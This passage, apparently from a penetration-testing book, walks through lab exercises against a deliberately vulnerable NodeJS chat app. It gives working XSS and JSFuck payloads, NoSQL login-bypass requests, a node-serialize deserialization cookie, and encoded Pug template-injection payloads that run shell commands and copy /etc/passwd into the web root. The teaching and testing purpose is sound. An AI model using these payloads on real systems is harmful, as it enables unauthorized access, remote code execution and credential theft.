language or\nframework.  Since every language has its oddities when it comes to\nvulnerabilities, it will be no dif ferent with NodeJS.\n \nIn the Advanced XSS section , you are going to walk through a few\nexamples where language-specific XSS vulnerabilities come into play.  Our\nNodeJS web application will be using one of the more common web stacks\nand configurations.  This implementation includes the Express Framework\n(https://expressjs.com/) with the Pug template engine (https://pugjs.or g/).  It\nis important to note that by default, Express really has no built-in XSS\nprevention unles s rendering through the template engine.  When a template\nengine like Pub is used, there are two common ways of finding XSS\nvulnerabilities: (1) through string interpolation, and (2) buf fered code.\n \nTemplate engines have a concept of string interpolation, which is a fancy\nway of saying “placeholders for string variables.”  For example , let's assign\na string to a variable in the Pug template format:\n- var title = \"This is the HTML T itle\"\n- var THP = \"Hack the Planet\"\nh1 #{title}\np The Hacker Playbook will teach you how to #{THP}\n \nNotice that the #{THP} is a placeholder for the variable that was assigned\nprior to THP.  We commonly  see these templates being used in email\ndistribution messages.  Have you ever received an email from an automated\nsystem that had Dear ${first_name}… instead of your actual first name? \nThis is exactly what templating engines are used for .\n \nWhen the template code above is rendered into HTML, it will look like:\n<h1>This is the HTML T itle</h1>\n<p>The Hacker Playbook will teach you how to Hack the\nPlanet</p>\n \nLuckily , in this case, we are using the \"#{}\" string interpolation, which is\nthe escaped version of Pug interpolation.  As you can see, by using a\ntemplate, we can create very reusable code and make the templates very\nlightweight.\n \nPug supports both escaped and unescaped string interpolation.  What's the\ndifference betw een escaped and unescaped?  Well, using escaped string\ninterpolation will HTML-encode characters like <,>,', and \".  This will\nassist in providing input validation back to the user.  If a developer uses an\nunescaped string interpolation, this will generally lead to XSS\nvulnerabilities. \n \nFurthermore, string interpolation (or variable interpolation, variable\nsubstitution, or variable expans ion) is the process of evaluat ing a string\nliteral containin g one or more placeholders, yielding a result in which the\nplaceholders are replaced with their corresponding values.\n[https://en.wikipedia.or g/wiki/String_interpolation]\nIn Pug escaped and unescaped string interpolation\n(https://pugjs.or g/language/interpolation.html):\n!{} – Unescaped string interpolation\n#{} – Escaped string interpolation  *Although this is\nescaped, it could still be vulnerable to XSS if directly\npassed through JavaScript\nIn JavaScript, unescaped buf fer code starts with \"!=\".  Anything\nafter the \"!=\" will automatically execute as JavaScript.\n[https://pugjs.or g/language/code.html#unescaped-buf fered-code]\nLastly , anytime raw HTML is allowed to be inserted, there is the\npotential for XSS.\n \nIn the real world, we have seen many cases that were vulnerable to XSS,\nbased on the above notation where the developer forgets which context they\nare in and from where the input is being passed.  Let’s take a look at a few\nof these example s on our vulner able Chat Support System Application.  Go\nto the following  URL on the VM: http://chat:3000/xss.  We will walk\nthrough each one of these exercises to understand NodeJS/Pug XSS.\nExer cise 1 (http://chat:3000/xss)\nIn this example,  we have escaped string interpolation into a paragraph tag. \nThis is not exploitable because we are using the correct escaped string\ninterpolation notation within the HTML paragraph context.             \nGo to http://chat:3000/xss and click Exercise #1\nThe Pug T emplate Source Code:\np No results found for #{name1}\nTry entering and submitting the following payload:\n<script>alert(1)</script>\nClick back on Exercise #1 and review the No Results Output\nView the HTML Response (view the Source Code of the page):\n&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;\n \n \nAfter hitting submit, look at the page source code (ctrl+u) and search for the\nword \"alert\". You are going to see that the special characters from our\npayload are converted into HTML entities.  The script tags are still visible\non our site through our browser , but are not rendered into JavaScript.  This\nuse of string interpolation is correct and there is really no way to break out\nof this scenario to find an XSS.  A+ work here!  Let's look at some poor\nimplementations.\nExer cise 2\nIn this example, we have unescaped string interpolation denoted by the !{}\nin a paragraph tag.  This is vulnerable to XSS by design.  Any basic XSS\npayload will trigger this, such as:  <script>alert(1)</script>\nGo to Exercise #2\nThe Pug T emplate Source Code:\np No results found for !{name2}\nTry entering the payload:\n<script>alert(1)</script>\nResponse:\n<script>alert(1)</script>\nAfter hitting submit, we should see our pop-up.  You can verify\nby looking at the page source code and searching for \"alert\".\n \nSo, using unescaped string interpolation (!{name2}) where user input is\nsubmitted, leads to a lot of trouble.  This is a poor practice and should never\nbe used for user-submitted data.  Any JavaScript we enter will be executed\non the victim's browser .\n \nExer cise 3\nIn this example, we have escaped string interpolation in dynamic inline\nJavaScript.  This means we are protected since it's escaped, right?  Not\nnecessarily .   This example is vulnerable because of the code context we are\nin.  We are going to see that in the Pug Template, prior to our escaped\ninterpolation, we are actually inside a script tag.  So, any JavaScript,\nalthough escape d, will automatically execute.  Even better , because we are\nin a Script tag, we do not need to use the <script> tag as part of our\npayload.  W e can use straight JavaScript, such as: alert(1):\nGo to Example #3\nPug T emplate Source Code:\nscript.\nvar user3 = #{name3};\np No results found for #{name3}\nThis template will translate in HTML like the following:\n<script>\n<p>No results found for [escaped user input]</p>\n</script>\nTry entering the payload:\n1;alert(1);\nAfter hitting submit, we should see our pop-up.  Y ou can verify\nby looking at the page source code and searching for \"alert\".\n \nAlthough, a small change, the proper way to write this would have been to\nadd quotes around the interpolation:\nPug T emplate Source Code:\nscript.\nvar user3=\"#{name3}\"\nExer cise 4\nIn this example, we have Pug unescaped buffered code\n(https://pugjs.or g/language/code.html) denoted by the != which is\nvulnerable to XSS by design, since there is no escaping.  So in this scenario,\nwe can use the simple \"<script >alert(1)</script>\" style attack against the\ninput field.\nPug T emplate Source Code:\np != 'No results found for '+name4\nTry entering the payload:\n<script>alert(1)</script>\nAfter hitting submit, we should see our pop-up.  You can verify\nby looking at the page source code and searching for \"alert\".\nExer cise 5\nLet's say we get to an appli cation that is using both escaped string\ninterpolation and some type of filtering.  In our following exercise, we have\nminimal blacklist filtering script being performed within the NodeJS server\ndropping characters like \"<\", \">\" and \"alert\".  But, again they made the\nmistake of putting our escaped string interpolation within a script tag.  If we\ncan get JavaScript in there, we could have an XSS:\nGo to Example #5\nPug T emplate Source Code:\nname5 = req.query .name5.replace(/[;'\"<>=]|alert/g,\"\")\nscript.\nvar user3 = #{name5};\nTry entering the payload:\nYou can try the alert(1), but that doesn't work due to\nthe filter .  You could also try things like\n<script>alert(1)</script>, but escaped code and the\nfilter will catch us.  What could we do if we really\nwanted to get our alert(1) payload?\nWe need to figure out how to bypass the filter to insert raw\nJavaScript.  Remember that JavaScript is extremely powerful\nand has lots of functionality .  We can abuse this functionality to\ncome up with some creative payloads.  One way to bypass these\nfilters is by utilizing esoteric JavaScript notation.  This can be\ncreated through a site called: http://www .jsfuck.com/.  As you\ncan see below , by using brackets, parentheses, plus symbols, and\nexclamation marks, we can recreate alert(1).\nJSF*ck Payload:\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+\n[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!!\n[]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+\n[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+\n[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!!\n[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])\n[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+\n(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+\n[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([]\n[[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+\n[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+\n[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!!\n[]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+\n[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+\n[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])\n[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])\n[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+\n[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!!\n[]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+\n[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+\n[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])\n[+!+[]]])[!+[]+!+[]+[+[]]])()\n \n \nAs you know , many browsers have started to include XSS protections.  We\nhave even used these payloads to bypass certain browser prote ctions.  Try\nusing them in your actual browser outside of Kali, such as Chrome.\n \nXSS is not an easy thing to prote ct from on complex applications.  It is easy\nto either miss or misunderstan d how a framework processes input and\noutput.  So when performing a source code review for Pug/NodeJS\napplications, searching for !{ , #{, or `${ in source code is helpful for\nidentifying locations for XSS.  Being aware of the context, and whether or\nnot escaping is required in that context, is vital as we will see in the\nfollowing examples. \n \nAlthough these attacks were specific to Node and Pug, every language has\nits problems against XSS and input validation.  You won't be able to just\nrun a vulnerability scanner or XSS fuzzing tool and find all the XSS\nvulnerabilities.  You really need to understand the language and frameworks\nused.\n \nXSS to Compr omise\nOne question I get often is, how can I go from an XSS to a Shell?  Although\nthere are many different ways to do this, we usually find that if we can get a\nuser-to-admin style XSS in a Content Management System (CMS) or\nsimilar , then this can lead to complete compromise of the system.  An entire\nwalkthrough example and code can be found here by Hans-Michael\nVarbaek: https://github.com/V arbaek/xsser .  Hans-Michael presented some\ngreat examples and videos on recreating an XSS to RCE attack.\n \nA custom  Red Team attack that I like to utilize involves taking advantage of\nthe features of JavaScript.  We know that JavaScript is extreme ly powerful\nand we have seen such features in BeEF (Browser Exploitation\nFramework).  Therefore, we can take all that functionality to perform an\nattack unbeknow nst to the victim.  What would this payload  do?  One\nexample of an attack is to have the JavaScript XSS payload that runs on a\nvictim machine grab the internal (natted) IP address of the victim.  We can\nthen take their IP address and start scanning their internal network with our\npayload.  If we find a known web application that allows compromise\nwithout authentication, we can send a malicious payload to that server . \n \nFor example our target could be a Jenkins server , which we know if\nunauthenticated, pretty much allows complete remote code execution.  To\nsee a full walkthrough of an XSS to Jenkins compromise, see chapter 5 -\nExploiting Internal Jenkins with Social Engineering. \n \nNoSQL Injections\nIn THP 1 & 2, we spent a fair amount of time learning how to do SQL\ninjections and using SQLMap (http://sqlmap.or g/).  Other than some\nobfuscation and integration into Burp Suite, not much has changed from\nTHP2.  Instead, I want to delve deeper into NoSQL injections as these\ndatabases are becoming more and more prevalent. \n \nTraditional SQL  databases like MySQL, MSSQL, and Oracle rely on\nstructured data in relational databases.  These databases are relational,\nmeaning data in one table has relation to data in other tables.  That makes it\neasy to perform queries such as \"give me all clients who bough t something\nin the last 30 days”.  The caveat  with this data is that the format of the data\nmust be kept consistent across the entire database.  NoSQL databases\nconsist of the data that does not typically follow the tabular/relational model\nas seen in SQL-queried databases. This data, called \"unstructured data\"\n(like pictures, videos, social media), doesn't really work with our massive\ncollection data.\n \nNoSQL Features:\nTypes of NoSQL Databases: Couch/MongoDB\nUnstructured Data\nGrows Horizontally\n \nIn traditional SQL injections, an attacker would try to break out of an SQL\nquery and modify the query on the server -side.  With NoSQL injections, the\nattacks may execute in other areas of an application than in traditional SQL\ninjections.  Additionally , in traditional SQL injections, an attacker would\nuse a tick mark to break out.  In NoSQL injections, vulnerabilities generally\nexist where a string is parsed or evaluated into a NoSQL call.\n \nVulnerabilities in NoSQL injections typically occur when: (1) the endpoint\naccepts JSON data in the reques t to NoSQL databases, and (2) we are able\nto manipulate the query using NoSQL comparison operators to change the\nNoSQL query .\n \nA comm on example of a NoSQ L injection would be injecting something\nlike: [{\"$gt\":\"\"}].  This JSON object is basically saying that the operator\n($gt) is greater than NULL (\"\").  Since logically everything is greater than\nNULL, the JSON  object becomes a true statement, allowing us to bypass or\ninject into NoSQL queries.  This would be equivalent to [' or 1=1--] in the\nSQL injection world.  In MongoDB, we can use one of the following\nconditional operators:\n(>) greater than - $gt\n(<) less than - $lt\n(>=) greater than equal to - $gte\n(<= ) less than equal to - $lte\n \nAttack the Customer Support System NoSQL Application\nFirst, walk through the NoSQL workflow on the Chat application: \nIn a browser , proxying through Burp Suite, access the Chat\napplication: http://chat:3000/nosql\nTry to authentic ate with any username and password.  Look at\nPOST traffic that was sent during that authentication request in\nBurp Suite\n.\n \n \nIn our Chat application, we are going to see that during authentication to the\n/loginnosql endpoint, our POST data will contain\n{“username”:”admin”,”password”,”GuessingAdminPassword”}.  It is\npretty common to see JSON being used in POST requests to authenticate a\nuser, but if we define our own JSON objects, we might be able to use\ndifferent condit ional statement s to make true statements.  This would\neffectively equal the traditional SQLi 1=1 statement and bypass\nauthentication.  Let's see if we can inject this into our application.\nServer Sour ce Code\nIn the NoSQL portion of the Chat application, we are going to see the JSON\nPOST request as we did befor e.  Even though, as a black box test, we\nwouldn't see the server -side source code, we can expect it to query the\nMongoDB backend in some sort of fashion similar to this:\ndb.collection(collection).find({\"username\":username,\n\"password\":password}).limit(1)…\n \nInjecting into NoSQL Chat\nAs we can see from the server -side source code, we are taking the user-\nsupplied usernam e/password to search the database for a match .  If we can\nmodify the POST request, we might be able to inject into the database\nquery .\nIn a browser , proxying through Burp Suite, access the Chat\napplication: http://chat:3000/nosql\nTurn \"Intercept\"  on in Burp Suite, click Login, and submit a\nusername as admin and a password of GuessingAdminPassword\nProxy the traf fic and intercept the POST request\n{\"username\":\"admin\",\"password\",\"GuessingAdminPassword\"}\nto {\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}\nYou should now be logged in as admin!\n \n \nSo what happened here?  W e changed the string \"GuessingAdminPassword\"\nto a JSON object {\"$gt\":\"\"}, which is the TRUE statement as everything\nGreater Than NULL is TRUE.  This changed the POST request to\n{\"username\":\"admin\",\"password\":TRUE}, which automatically makes the\nrequest TRUE and logs in as admin without any knowledge of the\npassword, replicating the 1=1 attack in SQLi.\nAdvanced NoSQLi\nNoSQL injectio ns aren't new, but the purpose of the NodeJS chapter is to\nshow how newer frameworks and languages can potentially introduce new\nvulnerabilities.  For example, Node.js has a qs module that has specific\nsyntax to convert HTTP request parameters into JSON objects.  The qs\nmodule is used by default in Express as part of the 'body-parser'\nmiddleware.\nqs module: A querystring parsing and stringifying library with\nsome added security . [https://www .npmjs.com/package/qs]\n \nWhat does this mean?  If the qs module is utilized, POST requests will be\nconverted on the server side as JSON if using bracket notation in the\nparameters.  Therefore, a POST request that looks like\nusername[value]=admin&password[value]=admin will be converted into\n{\"username\": {\"value\":\"admin\"}, \"password\":{\"value\":\"admin\"}}.  Now ,\nthe qs module will also accept and convert POST parameters  to assist in\nNoSQLi:\nFor example, we can have a POST request like the following:\nusername=admin&password[$gt]=\nAnd the server -side request conversion would translate to:\n{\"username\":\"admin\", \"password\":{\"$gt\":\"\"}\nThis now looks similar to the original NoSQLi attack.\n \nNow , our request looks identical to the NoSQLi we had in the previous\nsection.  Let's see this in action:\nGo to http://chat:3000/nosql2\nTurn Burp Intercept On\nLog in with admin:anything\nModify the POST Parameter:\nusername=admin&password[$gt]=&submit=login\n \n \nYou should be logged in with admin!  You have executed the NoSQL\ninjection using the qs module parser utilized by the Express Framework as\npart of the body-parser middlew are.  But wait, there's more!  What if you\ndidn't know which usernames to attack?  Could we use this same attack to\nfind and log in as other accounts? \n \nWhat if instead of the password  comparison, we tried it on the username as\nwell?  In this case, the NoSQLi POST request would look something like:\nusername[$gt]=admin&password[$gt]=&submit=login\n \nThe above POST request essentially queries the database for the next\nusername greate r than admin with the password field resulting in a TRUE\nstatement.  If successful, you should be logged in as the next user, in\nalphabetical order, after admin. Continue doing this until you find the\nsuperaccount.\n \nMore NoSQL Payloads:\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/mast\ner/NoSQL%20injection\nhttps://blog.websecurify .com/2014/08/hacking-nodejs-and-\nmongodb.htmlhttps://www .owasp.or g/index.php/T esting_for_No\nSQL_injection\n \nDeserialization Attacks\nOver the past few years, serialization/deserialization attacks via web have\nbecome more and more popula r.  We have seen many different talks at\nBlackHat, disco vered critical vulnerabilities in common appli cations like\nJenkins and Apache Struts2, and are seeing a lot of active research being\ndeveloped like ysoserial (https://github.com/frohof f/ysoserial).  So what's\nthe big deal with deserialization attacks?\n \nBefore we get started, we need to understand why we serialize.  There are\nmany reasons to serialize data, but it is most commonly used to generate a\nstorable represen tation of a value/data without losing its type or structure. \nSerialization converts objects into a stream of bytes to transfer over network\nor for storage.  Usually conversion method involves XML, JSON, or a\nserialization method specific to the language.\n \nDeserialization in NodeJS\nMany times, finding complex vulnerabilities requires in-depth knowledge\nof an application.  In our scenar io, the Chat NodeJS application is utilizing\na vulner able version of serialize.js (https://github.com/luin/seria lize).  This\nnode library was found to be vulnerable to exploitation due to the fact that\n\"Untrusted data passed into the unserialize() function can be exploited to\nachieve arbitrary code execution by passing a JavaScript Object with an\nImmediately Invoked Function Expression (IIFE).”\n[https://cve.mitre.or g/cgi-bin/cvename.cgi?name=CVE-2017-5941]\n \nLet's walk through the details of an attack to better understand what is\nhappening.  First, we review the serialize.js file and do a quick search for\neval (https://github.com/luin/serialize/search?\nutf8=%E2%9C%93&q=eval&type=).  Generally , allowing user input to go\ninto a JavaScript eval statement is bad news, as eval() executes raw\nJavaScript.  If an attacker is able to inject JavaScript into this statement,\nthey would be able to have Remote Code Execution onto the server . \n \nSecond, we need to create a serialized payload that will be deserialized and\nrun through eval with our JavaScript payload of\nrequire('child_process').exec('ls').\n{\"thp\":\"_$$ND_FUNC$$_function ()\n{require('child_process').exec('DO SYSTEM COMMANDS\nHERE', function(error , stdout, stderr) { console.log(stdout) });}\n()\"}\n \nThe JSON object above will pass the following request “()\n{require('child_process').exec('ls')” into the eval statement within the\nunserialize function, giving us remote code execution.  The last part to\nnotice is that the ending parenthesis was added \"()\" because without it our\nfunction would not be called.  Ajin Abraham, the original researcher who\ndiscovered this vulnerability , identified that using immediate ly invoked\nfunction expressions or IIFE (https://en.wikipedia.or g/wiki/Immediately-\ninvoked_function_expression) would allow the function to be executed\nafter creation.   More details on this vulnerability can be found here:\nhttps://cve.mitre.or g/cgi-bin/cvename.cgi?name=CVE-2017-5941.\n \nIn our Chat Application exampl e, we are going to look at the cookie value,\nwhich is being deserialized using this vulnerable library: \nGo to http://chat:3000\nProxy the traf fic in burp and look at the cookies\nIdentify one cookie name \"donotdecodeme\"\nCopy that Cookie into Burp Suite Decoder and Base64 decode it\n \n\n \nAs previously mentioned, every language has its unique oddities and\nNodeJS is no different. In Node/Expres s/Pug, you are not able to write\ndirectly to the web directory and have it accessible like in PHP.  There has\nto be a specified route to a folder that is both writable and accessible to the\npublic internet.\nCreating the Payload\nBefore you start, remember all these payloads for the lab are in\nan easy to copy/paste format listed here: http://bit.ly/2qBDrFo\nTake the original payload and modify your shell execution \"'DO\nSYSTEM COMMANDS HERE\"\n{\"thp\":\"_$$ND_FUNC$$_function ()\n{require('child_process').exec('DO SYSTEM\nCOMMANDS HERE', function(error , stdout, stderr) {\nconsole.log(stdout) });}()\"}\nExample:\n{\"thp\":\"_$$ND_FUNC$$_function ()\n{require('child_process').exec('echo node\ndeserialization is awesome!! >>\n/opt/web/chatSupportSystems/public/hacked.txt',\nfunction(error , stdout, stderr) { console.log(stdout)\n});}()\"}\nAs the original Cookie was encoded, we will have to base64\nencode our payload via Burp Decoder/Encoder\nExample Payload:\neyJ0aHAiOiJfJCRORF9GVU5DJCRfZnV uY3Rpb24\ngKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLm\nV4ZWMoJ2VjaG8gbm9kZSBkZXNlcmlhbGl6YXRp\nb24gaXMgYXdlc29tZSEhID4+IC9vcHQvd2V iL2No\nYXR TdXBwb3J0U3lzdGVtcy9wdWJsaWMvaGFja2\nVkLnR4dCcsIGZ1bmN0aW9uKGV ycm9yLCBzdGR\nvdXQsIHN0ZGV ycikgeyBjb25zb2xlLmxvZyhzdGRv\ndXQpIH0pO30oKSJ9\nLog out, turn Burp intercept on, and relay a request for / (home)\nModify the cookie to the newly created Base64\npayload\nForward the traf fic and since the public folder is a route for /,\nyou should be able to open a browser and go to\nhttp://chat:3000/hacked.txt\nYou now have Remote Code Execution!  Feel free to perform\npost exploitation on this system.  Start by trying to read\n/etc/passwd.\n \n\n \nIn the source for the node-serialize module, we see that the function\nexpression is being evaluated , which is a serious proble m for any\nJavaScript/NodeJS application that does this with user input.  This poor\npractice allowed us to compromise this application.\n \n \nReferences:\nhttps://opsecx.com/index.php/2017/02/08/exploiting-node-js-\ndeserialization-bug-for -remote-code-execution/\nhttps://github.com/luin/serialize\nhttps://snyk.io/test/npm/node-serialize?\nseverity=high&severity=medium&severity=low\nhttps://blog.websecurify .com/2017/02/hacking-node-\nserialize.html\n \nTemplate Engine Attacks - T emplate Injections\nTemplate engine s are being used more often due to their modularity and\nsuccinct code compared with standard HTML.  Template injection is when\nuser input is passed directly into render templates, allowing modification of\nthe unde rlying template.  This can occur intentionally in wikis, WSYWIG,\nor email templates.  It is rare for this to occur unintentionally , so it is often\nmisinterpreted as just XSS.  Template injection often allows the attacker to\naccess the underlying operating system to obtain remote code execution.\n \nIn our next exam ple, you will be performing Template Injectio n attacks on\nour NodeJS application via Pug.  We are unintentionally exposing ourselves\nto template injection with a meta redirect with user input, which is being\nrendered directly in Pug using template literals `${}`.  It is important to note\nthat template literals allow the use of newline characters, which  is required\nfor us to break out of the parag raph tag since Pug is space- and newline-\nsensitive, similar to Python.\n \nIn Pug, the first character or word represents a Pug keyword that denotes a\ntag or function.  You can specify  multiline strings as well using  indentation\nas seen below:\n \np.\nThis is a paragraph indentation.\nThis is still part of the paragraph tag.\n \nHere is an example of what HTML and Pug T emplate would look like:\n \n \nThe example text above shows how it would look in HTML and how the\ncorresponding Pug Markup language would look like.  With templates and\nstring interpolation, we can create quick, reusable, and ef ficient templates\nTemplate Injection Example\nThe Chat applic ation is vulnerable to a template injection attack.  In the\nfollowing application, we are going to see if we can interact with the Pug\ntemplating system.  This can generally be done by checking if the input\nparameter we supply can process basic operations.  James Kettle wrote a\ngreat paper on attack templates and interacting with the underlying template\nsystems (http://ubm.io/2ECTYSi). \n \nInteracting with Pug:\nGo to http://chat:3000 and login with any valid account\nGo to http://chat:3000/directmessage and enter user and\ncomment and 'Send' \nNext, go back to the directmessage and try entering an XSS\npayload into the user parameter <script>alert(1)</script>\nhttp://chat:3000/ti?\nuser=%3Cscript%3Ealert%281%29%3C%2Fscript%3\nE&comment=&link=             \nThis shows the application is vulnerable to XSS, but\ncan we interact with the templating system?\nIn Burp history , review the server request/response to the\nendpoint point /ti?user=, and send the request to Burp Repeater\n(ctrl+r)\n \n \nTesting for Basic Operations\nWe can test our XSS vulnerable parameter for template injections by\npassing it in an arithmetic string.  If our input is evaluated, it will identify\nthat it is vulnerable to template injection.  This is because templates, like\ncoding languages, can easily support evaluating arithmetic operators. \n \nTesting Basic Operators:\nWithin Burp Repeater , test each of the parameters on /ti for\ntemplate injection.  We can do this by passing a mathematical\noperation such as 9*9.\nWe can see that it did not work and we did not get 81.  Keep in\nmind that our user input is wrapped inside paragraph tags, so we\ncan assume our Pug template code looks something like this:\np Message has been sent to !{user}\n \nTaking Advantage of Pug Features:\nAs we said earlier, Pug is white space delimited (similar to\nPython) and newlines start a fresh template input, which means\nif we can break out of the current line in Pug, we can execute\nnew T emplate code.  In this case we are going to break out of the\nparagraph tag (<p>), as shown above, and execute new\nmalicious template code.  For this to work, we are going to have\nto use some URL encoding to exploit this vulnerability\n(http://bit.ly/2qxeDiy).\nLet's walk through each of the requirements to perform template\ninjection:\nFirst, we need to trigger a new line and break out of\nthe current template.  This can be done with the\nfollowing character:\n%0a  new line\nSecond, we can utilize the arithmetic function in Pug\nby using a \"=\" sign\n%3d  percent encoded \"=\" sign\nLastly , we can put in our mathematical equation\n9*9 Mathematical equation\nSo, the final payload will look like this:\n[newline]=9*9\nURL Coded:\nGET /ti?\nuser=%0a%3d9*9&comment=&link=\n/ti?user=%0a%3d9*9 gives us 81 in the response body .  You\nhave identified template injecti on in the user parameter!  Let's\nget remote code execution by abusing JavaScript.\n \n \nAs you can see in the response , instead of the name of the user, we have\n“81” outside the paragraph tags!   This means we were able to inject into the\ntemplate.\n \nWe now know that we have some sort of template injection and that we are\nable to perform simple calculations, but we need to see if we can get shell\nexecution.  To get shell execut ion, we have to find the right function to\nperform execution in Node/JavaScript.\nFirst, we will identify the self global object root and proceed\nwith determining which modules and functions we have access\nto.  W e want to eventually use the Require function to import the\nchild_process .exec to run operating system commands.  In Pug,\nthe \"=\" character allows us to output the JavaScript results.  W e\nwill start by accessing the global root:\n[new line]=global\nEncoding the above expression to URL encoding\nusing Burp's Decoder tool gives us:\n%0a%3d%20%67%6c%6f%62%61%6c\nUse the above URL encoding string as the user value and\nresend.\nIf all goes well after submitting the prior request, we will see\n[object global], which means we have access to the global\nobject.\n \n \nParsing the global object:\nLet's see what objects and properties we have access to by using\nthe Pug iterator 'each’ within global.  Remember the newline\n(%0a) and white space (%20):\neach val,index in global\np= index\nURL Encoded:\n%0a%65%61%63%68%20%76%61%6c%2c%69%6e%6\n4%65%78%20%69%6e%20%67%6c%6f%62%61%6c%0\na%20%20%70%3d%20%69%6e%64%65%78\nIn the above example, we are using the 'each' iterator which can\naccess a value and optionally access an index if we specify for\neither arrays or objects.  W e are trying to find what objects,\nmethods, or modules we have access to in the global object.  Our\nultimate goal is to find something like the \"require\" method to\nallow us to \"require\" child process .exec, which allows us to run\nsystem commands.  From here on out, we are just using trial and\nerror to identify methods or objects that will eventually give us\nthe require method.\n \n \nFinding the Code Execution Function:\nFrom the previous request, we saw all the objects within global\nand one that was named “process”.  Next, we need to identify\ninteresting objects we have access to within global.process:\neach val,index in global.process \n  p= index\nURL Encoded:\n%0a%65%61%63%68%20%76%61%6c%2c%69%6e\n%64%65%78%20%69%6e%20%67%6c%6f%62%61\n%6c%2e%70%72%6f%63%65%73%73%0a%20%20\n%70%3d%20%69%6e%64%65%78\nWe chose “process” out of all the available methods because we\nknew it would eventually lead to 'require'.  Y ou can try the trial\nand error process by choosing dif ferent methods to iterate\nthrough:\neach val,index in global.process.mainModule\np= index\nURL Encoded:\n%0a%65%61%63%68%20%76%61%6c%2c%69%6e%6\n4%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2\ne%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4\nd%6f%64%75%6c%65%0a%20%20%70%3d%20%69%\n6e%64%65%78\n \nRemote Code Execution:\nSending this final payload, we should see the \"require\" function\nwithin global.process.mainModule.  W e can now set this to\nimport a 'child_process' with .exec to obtain RCE:\n- var x = global.process.mainModule.require\n- x('child_process').exec('cat /etc/passwd >>\n/opt/web/chatSupportSystems/public/accounts.txt')\nURL Encoded:\n%0a%2d%20%76%61%72%20%78%20%3d%20%6\n7%6c%6f%62%61%6c%2e%70%72%6f%63%65%7\n3%73%2e%6d%61%69%6e%4d%6f%64%75%6c%6\n5%2e%72%65%71%75%69%72%65%20%0a%2d%\n20%78%28%27%63%68%69%6c%64%5f%70%72%\n6f%63%65%73%73%27%29%2e%65%78%65%63%\n28%27%63%61%74%20%2f%65%74%63%2f%70%\n61%73%73%77%64%20%3e%3e%20%2f%6f%70%\n74%2f%77%65%62%2f%63%68%61%74%53%75%\n70%70%6f%72%74%53%79%73%74%65%6d%73%\n2f%70%75%62%6c%69%63%2f%61%63%63%6f%\n75%6e%74%73%2e%74%78%74%27%29\nIn the above example, we are defining a variable “x” like we\nwould in JavaScript, but the dash at the beginning of the line\ndenotes an unbuf fered output (hidden).  W e are using the global\nobject with the modules that we needed to eventually get\n'require', which allows us to use 'child_process' .exec to run\nsystem commands. \nWe are outputting the contents of /etc/passwd to the web public\nroot directory , which is the only directory we have write access\nto (as designed by the app creators), allowing the user to view\nthe contents.  W e could also do a reverse shell or anything else\nallowable with system commands.\nWe can see http://chat:3000/accounts.txt will contain the\ncontents of /etc/passwd from the web server .\nUse this to perform a full RCE on the system and get a shell\nback.\n \n \nNow , can we automate a lot of this?  Of course we can.  A tool called\nTplmap (https://github.com/epin na/tplmap) runs similar to SQLmap in that\nit tries all the dif ferent combinations of template injections:\ncd /opt/tplmap\n./tplmap.py -u \"http://chat:3000/ti?\nuser=*&comment=asdfasdf&link=\"\n \n \nReference:\nhttp://blog.portswigger .net/2015/08/server -side-template-\ninjection.html\nhttps://hawkinsecurity .com/2017/12/13/rce-via-spring-engine-\nssti/\n \nJavaScript and Remote Code Execution\nRemote code execution is what we look for in every assessment and web\napplication penetration test.  Although RCEs can be found just about\neverywhere, they are most commonly found in places that allow uploads,\nsuch as: uploading a web shell, an exploit like Imagetragick\n(https://imagetragick.com/), XXE attacks with Office Files, directory\ntraversal-based uploads to replace critical files, and more. \n \nTraditionally , we might try to find an upload area and a shell that we could\nutilize.  A great  list of differen t types of webshell payloads can be found\nhere: https://github.com/tennc/w ebshell.  Please note, I am in no way\nvetting any of these shells—use them at your own risk.  I have run into a lot\nof web shells that I found on the internet which contained. \nAttacking the V ulnerable Chat Application with Upload\nIn our lab, we are going to perfo rm an upload RCE on a Node application. \nIn our example, there is a file upload feature that allows any file upload. \nUnfortunately , with Node, we can't just call a file via a web browser to\nexecute the file, like in PHP .  So, in this case, we are going to use a dynamic\nrouting endpoint that tries to render the contents of Pug files.  The error lies\nin the fact that the endpoint will read the contents of the file assuming it is a\nPug file since the default directory exists within the Views directory .  Path\ntraversal and Local File read vulnerabilities also exist on this endpoint.\n \n \nDuring the upload process, the file 